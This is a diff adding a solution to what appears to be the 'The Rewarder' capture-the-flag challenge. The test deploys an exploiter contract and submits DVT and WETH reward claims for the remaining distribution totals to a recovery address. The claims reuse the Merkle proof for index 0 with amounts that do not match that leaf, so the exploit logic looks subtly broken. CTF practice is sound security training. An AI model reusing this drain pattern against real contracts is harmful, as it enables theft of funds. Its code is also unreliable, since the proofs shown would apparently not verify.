@@ -148,7 +148,39 @@ contract TheRewarderChallenge is Test {
      * CODE YOUR SOLUTION HERE
      */
     function test_theRewarder() public checkSolvedByPlayer {
-        
+        // Deploy exploiter contract
+        TheRewarderExploiter exploiter = new TheRewarderExploiter(distributor);
+
+        // Load reward data from JSON files
+        bytes32[] memory dvtLeaves = _loadRewards("/test/the-rewarder/dvt-distribution.json");
+        bytes32[] memory wethLeaves = _loadRewards("/test/the-rewarder/weth-distribution.json");
+
+        // Set DVT and WETH as tokens to claim
+        IERC20[] memory tokensToClaim = new IERC20[](2);
+        tokensToClaim[0] = IERC20(address(dvt));
+        tokensToClaim[1] = IERC20(address(weth));
+
+        // Create claims array for all unclaimed rewards
+        Claim[] memory claims = new Claim[](2);
+
+        // First, the DVT claim
+        claims[0] = Claim({
+            batchNumber: 0,
+            amount: TOTAL_DVT_DISTRIBUTION_AMOUNT - ALICE_DVT_CLAIM_AMOUNT,
+            tokenIndex: 0,
+            proof: merkle.getProof(dvtLeaves, 0) // Use index 0 for maximum amount
+        });
+
+        // Then, the WETH claim
+        claims[1] = Claim({
+            batchNumber: 0,
+            amount: TOTAL_WETH_DISTRIBUTION_AMOUNT - ALICE_WETH_CLAIM_AMOUNT,
+            tokenIndex: 1,
+            proof: merkle.getProof(wethLeaves, 0) // Use index 0 for maximum amount
+        });
+
+        // Execute attack to claim rewards and send to recovery
+        exploiter.attack(claims, tokensToClaim, recovery);
     }
 
     /**
